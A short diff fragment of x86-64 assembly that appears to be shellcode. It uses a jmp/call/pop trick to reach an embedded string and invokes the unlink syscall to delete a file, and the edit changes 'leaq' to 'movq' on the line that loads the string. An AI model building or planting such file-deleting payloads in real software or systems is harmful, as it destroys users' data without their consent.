@@ -10,7 +10,7 @@
 	jmp	calladdr
 
  popladdr:
-	leaq STRING, %rdi
+	movq STRING, %rdi
 	xorq %rax, %rax
 	movb $SYS_unlink, %al
 	syscall
